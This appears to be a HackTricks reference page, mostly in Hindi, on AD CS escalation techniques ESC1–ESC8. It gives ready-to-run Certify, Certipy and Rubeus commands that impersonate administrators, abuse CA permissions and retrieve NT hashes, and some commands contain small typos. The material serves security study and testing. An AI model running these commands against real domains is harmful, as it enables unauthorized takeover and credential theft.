# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**यह पोस्ट्स के escalation technique सेक्शनों का सारांश है:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **Enrolment rights Enterprise CA द्वारा low-privileged users को दिए गए हैं।**
- **Manager approval की आवश्यकता नहीं है।**
- **Authorized personnel के हस्ताक्षर आवश्यक नहीं हैं।**
- **Certificate templates पर security descriptors बहुत permissive हैं, जिससे low-privileged users enrolment rights प्राप्त कर सकते हैं।**
- **Certificate templates ऐसे EKUs निर्धारित करने के लिए कॉन्फ़िगर किए गए हैं जो authentication को सक्षम करते हैं:**
- Extended Key Usage (EKU) identifiers जैसे Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), या कोई EKU नहीं (SubCA) शामिल हैं।
- **Template के द्वारा Certificate Signing Request (CSR) में subjectAltName शामिल करने के लिए requesters को अनुमति दी गई है:**
- Active Directory (AD) किसी certificate में subjectAltName (SAN) को identity verification के लिए प्राथमिकता देता है अगर यह मौजूद हो। इसका मतलब है कि CSR में SAN निर्दिष्ट करके, कोई certificate किसी भी user (उदा., एक domain administrator) का impersonate करने के लिए request किया जा सकता है। यह कि requester द्वारा SAN निर्दिष्ट किया जा सकता है या नहीं, यह certificate template के AD object में `mspki-certificate-name-flag` property के माध्यम से संकेतित होता है। यह property एक bitmask है, और `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag की उपस्थिति requester को SAN निर्दिष्ट करने की अनुमति देती है।

> [!CAUTION]
> यह कॉन्फ़िगरेशन low-privileged users को किसी भी चुनी हुई SAN के साथ certificates request करने की अनुमति देता है, जिससे Kerberos या SChannel के माध्यम से किसी भी domain principal के रूप में authentication संभव हो जाता है।

यह सुविधा कभी-कभी products या deployment services द्वारा on-the-fly HTTPS या host certificates जनरेट करने के समर्थन के लिए सक्षम की जाती है, या समझ की कमी के कारण रहती है।

यह ध्यान दिया गया है कि इस विकल्प के साथ एक certificate बनाने पर एक warning ट्रिगर होता है, जो उस स्थिति में लागू नहीं होता जब कोई मौजूदा certificate template (जैसे `WebServer` template, जिसमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled है) डुप्लिकेट किया जाता है और फिर authentication OID शामिल करने के लिए मॉडिफाई किया जाता है।

### Abuse

To **find vulnerable certificate templates** you can run:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
इस **भेद्यता का दुरुपयोग करके किसी प्रशासक की नकल करने के लिए** आप निम्न चला सकते हैं:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
फिर आप जनरेट किए गए **certificate को `.pfx`** फॉर्मैट में बदलकर फिर से **Rubeus या certipy का उपयोग करके authenticate** कर सकते हैं:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows बाइनरीज़ "Certreq.exe" & "Certutil.exe" का उपयोग PFX जनरेट करने के लिए किया जा सकता है: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest के configuration schema में certificate templates की enumeration, विशेषकर वे जिनके लिए approval या signatures की आवश्यकता नहीं होती, जिनमें Client Authentication या Smart Card Logon EKU शामिल हों, और जिनमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag सक्षम हो, निम्न LDAP query चलाकर की जा सकती है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## गलत कॉन्फ़िगर किए गए सर्टिफिकेट टेम्पलेट - ESC2

### व्याख्या

दूसरा abuso परिदृश्य पहले वाले का एक रूपांतर है:

1. Enrollment rights कम-प्रिविलेज्ड users को Enterprise CA द्वारा दिए गए हैं।
2. Manager approval की आवश्यकता अक्षम कर दी गई है।
3. Authorized signatures की आवश्यकता हटा दी गई है।
4. Certificate template पर एक अत्यधिक अनुमतिप्रद security descriptor कम-प्रिविलेज्ड users को certificate enrollment rights देता है।
5. **सर्टिफिकेट टेम्पलेट को Any Purpose EKU शामिल करने या कोई EKU न रखने के लिए परिभाषित किया गया है।**

**Any Purpose EKU** किसी attacker को किसी भी purpose के लिए certificate प्राप्त करने की अनुमति देता है, जिसमें client authentication, server authentication, code signing, आदि शामिल हैं। इस परिदृश्य का शोषण करने के लिए वही **technique used for ESC3** लागू की जा सकती है।

कोई EKUs न होने वाले certificates, जो subordinate CA certificates के रूप में कार्य करते हैं, को किसी भी purpose के लिए शोषित किया जा सकता है और इन्हें नए certificates पर हस्ताक्षर करने के लिए भी उपयोग किया जा सकता है। इसलिए, attacker subordinate CA certificate का उपयोग करके नए certificates में arbitrary EKUs या फ़ील्ड निर्दिष्ट कर सकता है।

हालाँकि, यदि subordinate CA `NTAuthCertificates` ऑब्जेक्ट द्वारा trusted नहीं है (जो डिफ़ॉल्ट सेटिंग है), तो domain authentication के लिए बनाए गए नए certificates काम नहीं करेंगे। इसके बावजूद, attacker अभी भी किसी भी EKU और arbitrary certificate मानों के साथ नए certificates बना सकता है। इन्हें संभावित रूप से कई उद्देश्यों (जैसे code signing, server authentication, आदि) के लिए abuso किया जा सकता है और नेटवर्क में अन्य अनुप्रयोगों जैसे SAML, AD FS, या IPSec के लिए महत्वपूर्ण प्रभाव हो सकते हैं।

AD Forest की configuration schema में इस परिदृश्य से मेल खाने वाले टेम्पलेट्स को सूचीबद्ध करने के लिए निम्न LDAP query चलाई जा सकती है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## गलत कॉन्फ़िगर Enrolment Agent Templates - ESC3

### व्याख्या

यह परिदृश्य पहले और दूसरे वाले जैसा है लेकिन **दुरुपयोग** करता है एक **अलग EKU** (Certificate Request Agent) और **2 अलग टेम्पलेट्स** (इसलिए इसकी आवश्यकताओं के 2 सेट हैं),

The Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1), known as **Enrollment Agent** in Microsoft documentation, allows a principal to **enroll** for a **certificate** on **behalf of another user**.

The “enrollment agent” ऐसे किसी **template** में **enroll** करता है और प्राप्त **certificate** का उपयोग अन्य उपयोगकर्ता की ओर से **CSR** को **co-sign** करने के लिए करता है। फिर यह **co-signed CSR** को **CA** को भेजता है, जिस **template** में यह **enroll** करता है वह **“enroll on behalf of”** की अनुमति देता है, और **CA** इसका उत्तर उस **“अन्य”** उपयोगकर्ता का **certificate** देकर करता है।

**Requirements 1:**

- Enterprise CA द्वारा कम-privileged उपयोगकर्ताओं को Enrollment rights प्रदान किए गए हैं।
- प्रबंधक अनुमोदन की आवश्यकता हटा दी गई है।
- अधिकृत हस्ताक्षरों की कोई आवश्यकता नहीं है।
- certificate template का security descriptor अत्यधिक permissive है, जिससे enrollment rights कम-privileged उपयोगकर्ताओं को मिल जाते हैं।
- certificate template में Certificate Request Agent EKU शामिल है, जो अन्य प्रिंसिपल्स की ओर से अन्य certificate templates का अनुरोध करने में सक्षम बनाता है।

**Requirements 2:**

- Enterprise CA कम-privileged उपयोगकर्ताओं को enrollment rights प्रदान करता है।
- प्रबंधक अनुमोदन को बायपास किया गया है।
- Template का schema version या तो 1 है या 2 से अधिक है, और यह एक Application Policy Issuance Requirement निर्दिष्ट करता है जो Certificate Request Agent EKU की आवश्यकता रखता है।
- certificate template में परिभाषित एक EKU domain authentication की अनुमति देता है।
- Enrollment agents के लिए प्रतिबंध CA पर लागू नहीं किए गए हैं।

### दुरुपयोग

आप इस परिदृश्य का दुरुपयोग करने के लिए [**Certify**](https://github.com/GhostPack/Certify) या [**Certipy**](https://github.com/ly4k/Certipy) का उपयोग कर सकते हैं:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
वे **उपयोगकर्ता** जिन्हें **enrollment agent certificate** प्राप्त करने की अनुमति है, जिन **टेम्पलेट्स** में enrollment **agents** को enroll करने की अनुमति है, और जिन **accounts** के behalf पर enrollment agent कार्य कर सकता है, उन्हें एंटरप्राइज़ CAs द्वारा सीमित किया जा सकता है। यह `certsrc.msc` **snap-in** खोलकर, **CA पर right-click करने**, **Properties पर क्लिक करने**, और फिर **“Enrollment Agents” टैब पर नेविगेट करने** से किया जाता है।

हालाँकि, यह नोट किया गया है कि CAs के लिए **default** सेटिंग “Do not restrict enrollment agents.” है। जब एडमिनिस्ट्रेटर enrollment agents पर प्रतिबंध सक्षम करके इसे “Restrict enrollment agents” पर सेट करते हैं, तब भी डिफ़ॉल्ट कॉन्फ़िगरेशन अत्यंत उदार रहती है। यह **Everyone** को सभी टेम्पलेट्स में किसी भी व्यक्ति के रूप में enroll करने की अनुमति देता है।

## कमजोर प्रमाणपत्र टेम्पलेट एक्सेस कंट्रोल - ESC4

### स्पष्टीकरण

**certificate templates** पर मौजूद **security descriptor** यह परिभाषित करता है कि विशिष्ट **AD principals** के पास टेम्पलेट के संबंध में कौन सी **permissions** हैं।

यदि कोई **हमलावर** आवश्यक **अनुमतियाँ** रखता है किसी **टेम्पलेट** को **बदलने** और किसी भी **शोषण योग्य कॉन्फ़िगरेशन त्रुटियाँ** को **लागू करने** की जो **पूर्व अनुभागों** में उल्लिखित हैं, तो **विशेषाधिकार वृद्धि** सक्षम हो सकती है।

प्रमाणपत्र टेम्पलेट्स पर लागू होने वाली उल्लेखनीय अनुमतियाँ शामिल हैं:

- **Owner:** वस्तु पर निहित नियंत्रण प्रदान करता है, जिससे किसी भी attributes में संशोधन संभव होता है।
- **FullControl:** वस्तु पर पूर्ण अधिकार सक्षम करता है, जिसमें किसी भी attributes को बदलने की क्षमता शामिल है।
- **WriteOwner:** वस्तु के owner को हमलावर के नियंत्रण वाले किसी principal में बदलने की अनुमति देता है।
- **WriteDacl:** एक्सेस कंट्रोल समायोजित करने की अनुमति देता है, संभावित रूप से हमलावर को FullControl दे सकता है।
- **WriteProperty:** किसी भी वस्तु गुण को संपादित करने का अधिकार देता है।

### दुरुपयोग

टेम्पलेट्स और अन्य PKI objects पर edit अधिकार रखने वाले principals की पहचान करने के लिए, Certify के साथ enumerate करें:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
पिछले वाले की तरह एक privesc का एक उदाहरण:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 तब होता है जब किसी उपयोगकर्ता के पास किसी सर्टिफिकेट टेम्पलेट पर write privileges होते हैं। इसे उदाहरण के तौर पर सर्टिफिकेट टेम्पलेट की configuration को overwrite करने के लिए abuse किया जा सकता है ताकि वह टेम्पलेट ESC1 के लिए vulnerable बन जाए।

जैसा कि ऊपर path में दिख रहा है, केवल `JOHNPC` के पास ये privileges हैं, लेकिन हमारे उपयोगकर्ता `JOHN` के पास `JOHNPC` की ओर नया `AddKeyCredentialLink` edge है। चूँकि यह technique certificates से संबंधित है, मैंने इस attack को भी implement किया है, जिसे [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) के नाम से जाना जाता है। यहाँ Certipy के `shadow auto` कमांड की एक छोटी झलक है, जो पीड़ित का NT hash retrieve करने के लिए है।
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** एक single कमांड में certificate template के configuration को overwrite कर सकता है। By **default**, Certipy configuration को **overwrite** कर देगा ताकि वह **vulnerable to ESC1** बन जाए। हम **`-save-old` parameter to save the old configuration** भी specify कर सकते हैं, जो हमारे attack के बाद configuration **restoring** करने के लिए उपयोगी होगा।
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## कमजोर PKI ऑब्जेक्ट एक्सेस कंट्रोल - ESC5

### व्याख्या

ACL-आधारित आपस में जुड़े रिश्तों का विस्तृत जाल, जिसमें certificate templates और certificate authority से आगे कई ऑब्जेक्ट शामिल हैं, पूरे AD CS सिस्टम की सुरक्षा को प्रभावित कर सकता है। ये ऑब्जेक्ट, जो सुरक्षा पर महत्वपूर्ण प्रभाव डाल सकते हैं, में शामिल हैं:

- CA सर्वर का AD कंप्यूटर ऑब्जेक्ट, जिसे S4U2Self या S4U2Proxy जैसी प्रक्रियाओं के माध्यम से समझौता किया जा सकता है।
- CA सर्वर का RPC/DCOM सर्वर।
- निर्दिष्ट कंटेनर पथ `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` के अंतर्गत किसी भी वंशज AD ऑब्जेक्ट या कंटेनर। यह पथ, पर सीमित नहीं है, में Certificate Templates container, Certification Authorities container, NTAuthCertificates ऑब्जेक्ट, और Enrollment Services Container जैसे कंटेनर और ऑब्जेक्ट शामिल हैं।

यदि कोई कम-विशेषाधिकार प्राप्त हमलावर इन किसी भी महत्वपूर्ण घटकों पर नियंत्रण हासिल कर ले तो PKI सिस्टम की सुरक्षा समझौता हो सकती है।

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### व्याख्या

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) में चर्चा किए गए विषय में Microsoft द्वारा बताए गए अनुसार **`EDITF_ATTRIBUTESUBJECTALTNAME2`** फ़्लैग के प्रभाव भी शामिल हैं। यह कॉन्फ़िगरेशन, जब Certification Authority (CA) पर सक्रिय किया जाता है, तो किसी भी request के लिए—उनमें से वे भी जो Active Directory® से बनाए गए हैं—subject alternative name में **user-defined values** को शामिल करने की अनुमति देता है। परिणामस्वरूप, यह प्रावधान एक **घुसपैठिया** को डोमेन **authentication** के लिए सेट किए गए **किसी भी template** के माध्यम से enroll करने की अनुमति देता है—विशेषकर उन टेम्पलेट्स के लिए जो standard User template जैसे कम-विशेषाधिकार उपयोगकर्ता enrollment के लिए खुले होते हैं। नतीजतन, एक प्रमाणपत्र प्राप्त किया जा सकता है, जिससे घुसपैठिया डोमेन एडमिनिस्ट्रेटर या डोमेन के किसी भी अन्य सक्रिय इकाई के रूप में प्रमाणीकरण कर सकता है।

नोट: Certificate Signing Request (CSR) में alternative names जोड़ने का तरीका, `certreq.exe` में `-attrib "SAN:"` आर्गुमेंट के माध्यम से (जिसे “Name Value Pairs” कहा जाता है), ESC1 में SANs के शोषण रणनीति से एक **भिन्नता** प्रस्तुत करता है। यहाँ अंतर इस बात में है कि **खाता जानकारी कैसे समाहित की जाती है** — एक certificate attribute के भीतर, न कि extension में।

### दुरुपयोग

यह पुष्टि करने के लिए कि यह सेटिंग सक्रिय है या नहीं, संगठन निम्न कमांड का उपयोग `certutil.exe` के साथ कर सकते हैं:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
यह ऑपरेशन मूल रूप से **remote registry access** का उपयोग करता है, इसलिए एक वैकल्पिक तरीका हो सकता है:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) और [**Certipy**](https://github.com/ly4k/Certipy) जैसे उपकरण इस misconfiguration का पता लगाने और exploiting करने में सक्षम हैं:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
इन सेटिंग्स को बदलने के लिए, यह मानते हुए कि किसी के पास **डोमेन प्रशासनिक** अधिकार या समकक्ष हों, निम्नलिखित कमांड किसी भी वर्कस्टेशन से निष्पादित की जा सकती है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
अपने पर्यावरण में इस कॉन्फ़िगरेशन को निष्क्रिय करने के लिए, flag को हटाया जा सकता है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> May 2022 सुरक्षा अपडेट के बाद, हाल ही में जारी किए गए **प्रमाणपत्र** में एक **सुरक्षा एक्सटेंशन** शामिल होगा जो **अनुरोधकर्ता की `objectSid` property** को सम्मिलित करता है। ESC1 के लिए, यह SID निर्दिष्ट SAN से व्युत्पन्न होता है। हालांकि, **ESC6** के लिए, SID **अनुरोधकर्ता की `objectSid`** को प्रतिबिंबित करता है, SAN नहीं।\
> ESC6 का शोषण करने के लिए, सिस्टम का ESC10 (Weak Certificate Mappings) के लिए संवेदनशील होना आवश्यक है, जो **नई सुरक्षा एक्सटेंशन के बजाय SAN को प्राथमिकता देता है**।

## कमजोर प्रमाणपत्र प्राधिकरण पहुँच नियंत्रण - ESC7

### हमला 1

#### विवरण

एक प्रमाणपत्र प्राधिकरण के लिए पहुंच नियंत्रण उन अनुमतियों के सेट के माध्यम से बनाए रखा जाता है जो CA की क्रियाओं को नियंत्रित करती हैं। इन अनुमतियों को देखने के लिए `certsrv.msc` खोलें, किसी CA पर राइट-क्लिक करें, Properties चुनें, और फिर Security tab पर जाएँ। इसके अतिरिक्त, अनुमतियों को PSPKI मॉड्यूल का उपयोग करके निम्नलिखित जैसे कमांड्स के साथ सूचीबद्ध किया जा सकता है:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA administrator” and “Certificate Manager” respectively.

#### दुरुपयोग

Having **`ManageCA`** rights on a certificate authority enables the principal to manipulate settings remotely using PSPKI. This includes toggling the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag to permit SAN specification in any template, a critical aspect of domain escalation.

Simplification of this process is achievable through the use of PSPKI’s **Enable-PolicyModuleFlag** cmdlet, allowing modifications without direct GUI interaction.

Possession of **`ManageCertificates`** rights facilitates the approval of pending requests, effectively circumventing the "CA certificate manager approval" safeguard.

A combination of **Certify** and **PSPKI** modules can be utilized to request, approve, and download a certificate:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### व्याख्या

> [!WARNING]
> पिछले attack में **`Manage CA`** अनुमतियों का उपयोग **EDITF_ATTRIBUTESUBJECTALTNAME2** फ्लैग को **सक्षम** करने के लिए किया गया था ताकि **ESC6 attack** किया जा सके, लेकिन जब तक CA सेवा (`CertSvc`) को पुनरारंभ नहीं किया जाता, इसका कोई प्रभाव नहीं होगा। जब किसी उपयोगकर्ता के पास `Manage CA` एक्सेस राइट होता है, तो उस उपयोगकर्ता को **सेवा को पुनरारंभ करने** की अनुमति भी होती है। हालांकि, इसका यह मतलब **नहीं** है कि उपयोगकर्ता सेवा को रिमोटली पुनरारंभ कर सकता है। इसके अलावा, E**SC6 might not work out of the box** अधिकांश पैच्ड वातावरणों में May 2022 सुरक्षा अपडेट्स के कारण।
>
> इसलिए, यहां एक और attack प्रस्तुत किया गया है।
>
> पूर्व-आवश्यकताएँ:
>
> - केवल **`ManageCA` अनुमति**
> - **`Manage Certificates`** अनुमति (यह **`ManageCA`** से प्रदान की जा सकती है)
> - प्रमाणपत्र टेम्पलेट **`SubCA`** को **सक्षम** होना चाहिए (यह **`ManageCA`** से सक्षम किया जा सकता है)
>
> यह तकनीक इस तथ्य पर निर्भर करती है कि जिन उपयोगकर्ताओं के पास `Manage CA` _और_ `Manage Certificates` एक्सेस राइट होते हैं वे **असफल प्रमाणपत्र अनुरोध जारी कर सकते हैं**। **`SubCA`** प्रमाणपत्र टेम्पलेट **ESC1 के लिए भेद्य** है, लेकिन **केवल administrators** टेम्पलेट में नामांकन कर सकते हैं। इसलिए, एक **user** **`SubCA`** में नामांकन के लिए **request** कर सकता है — जिसे **deny** किया जाएगा — लेकिन बाद में manager द्वारा **issue** कर दिया जाएगा।
>
> #### दुरुपयोग
>
> आप अपने आप को **`Manage Certificates`** एक्सेस राइट दे सकते हैं अपने user को एक नया officer के रूप में जोड़कर।
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** टेम्पलेट को **CA पर सक्षम** किया जा सकता है `-enable-template` पैरामीटर के साथ। डिफ़ॉल्ट रूप से, `SubCA` टेम्पलेट सक्षम है।
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
यदि हमने इस हमले के लिए पूर्वापेक्षाएँ पूरी कर ली हैं, तो हम **`SubCA` टेम्पलेट पर आधारित प्रमाणपत्र का अनुरोध करके** शुरू कर सकते हैं।

**यह अनुरोध अस्वीकृ**त, लेकिन हम private key को सहेजेंगे और request ID नोट कर लेंगे।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
हमारी **`Manage CA` और `Manage Certificates`** के साथ, हम फिर `ca` कमांड और `-issue-request <request ID>` पैरामीटर के साथ **असफल सर्टिफिकेट जारी करने का** अनुरोध कर सकते हैं।
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
और अंत में, हम `req` कमांड और `-retrieve <request ID>` पैरामीटर का उपयोग करके **जारी किए गए प्रमाणपत्र को पुनः प्राप्त कर सकते हैं**।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explanation

क्लासिक ESC7 abuses (EDITF attributes सक्षम करना या pending requests को approve करना) के अलावा, **Certify 2.0** ने एक नया primitive उजागर किया है जिसे Enterprise CA पर केवल *Manage Certificates* (या **Certificate Manager / Officer**) भूमिका की आवश्यकता होती है।

`ICertAdmin::SetExtension` RPC method किसी भी principal द्वारा चलाया जा सकता है जिसके पास *Manage Certificates* है। जबकि यह method पारंपरिक रूप से legitimate CAs द्वारा **pending** requests पर extensions अपडेट करने के लिए उपयोग किया जाता था, एक attacker इसे किसी awaiting approval request में **एक *non-default* certificate extension जोड़ने** के लिए abuse कर सकता है (उदाहरण के लिए एक कस्टम *Certificate Issuance Policy* OID जैसे `1.1.1.1`)।

क्योंकि targeted template उस extension के लिए **default value परिभाषित नहीं करता**, CA उस attacker-controlled value को request जारी होने पर overwrite नहीं करेगा। परिणामस्वरूप certificate में attacker-निर्धारित extension शामिल होगा जो कि:

* अन्य vulnerable templates की Application / Issuance Policy आवश्यकताओं को पूरा कर सकता है (जिससे privilege escalation हो सकता है)।
* अतिरिक्त EKUs या policies inject कर सकता है जो certificate को थर्ड-पार्टी सिस्टम्स में अनपेक्षित trust दे देते हैं।

संक्षेप में, *Manage Certificates* — जिसे पहले ESC7 के “कम शक्तिशाली” आधे के रूप में माना जाता था — अब बिना CA configuration को छूए या अधिक restrictive *Manage CA* अधिकार की आवश्यकता के बिना पूर्ण privilege escalation या long-term persistence के लिए leveraged किया जा सकता है।

#### Abusing the primitive with Certify 2.0

1. **ऐसा certificate request submit करें जो *pending* रहेगा।** इसे उस template के साथ मजबूर किया जा सकता है जिसे manager approval की आवश्यकता हो:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. नए `manage-ca` command का उपयोग कर pending request में एक custom extension append करें:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*यदि template पहले से *Certificate Issuance Policies* extension परिभाषित नहीं करता है, तो ऊपर दिया गया value issuance के बाद संरक्षित रहेगा।*

3. **Request को issue करें** (यदि आपकी भूमिका में *Manage Certificates* approval rights भी हैं) या किसी operator के approve करने का इंतज़ार करें। एक बार issued होने पर certificate डाउनलोड करें:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. परिणामस्वरूप certificate अब malicious issuance-policy OID को रखता है और subsequent attacks (जैसे ESC13, domain escalation, आदि) में उपयोग किया जा सकता है।

> NOTE:  वही attack Certipy ≥ 4.7 के साथ `ca` command और `-set-extension` parameter के ज़रिए भी executed किया जा सकता है।

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

> [!TIP]
> जिन environments में **AD CS installed** है, यदि कोई **web enrollment endpoint vulnerable** है और कम से कम एक **certificate template published** है जो **domain computer enrollment और client authentication** की अनुमति देता है (उदाहरण के लिए default **`Machine`** template), तो यह संभव हो जाता है कि **spooler service सक्रिय किसी भी कंप्यूटर को attacker द्वारा compromise किया जा सके**!

AD CS कई **HTTP-based enrollment methods** को सपोर्ट करता है, जो additional server roles के माध्यम से उपलब्ध कराए जाते हैं जिन्हें administrators इंस्टॉल कर सकते हैं। ये HTTP-based certificate enrollment इंटरफेस **NTLM relay attacks** के प्रति susceptible होते हैं। एक attacker, एक **compromised machine** से, किसी भी AD account की impersonation कर सकता है जो inbound NTLM के माध्यम से authenticate करता है। victim account की impersonation करते हुए, attacker इन web interfaces को access कर सकता है और `User` या `Machine` certificate templates का उपयोग करके **client authentication certificate** request कर सकता है।

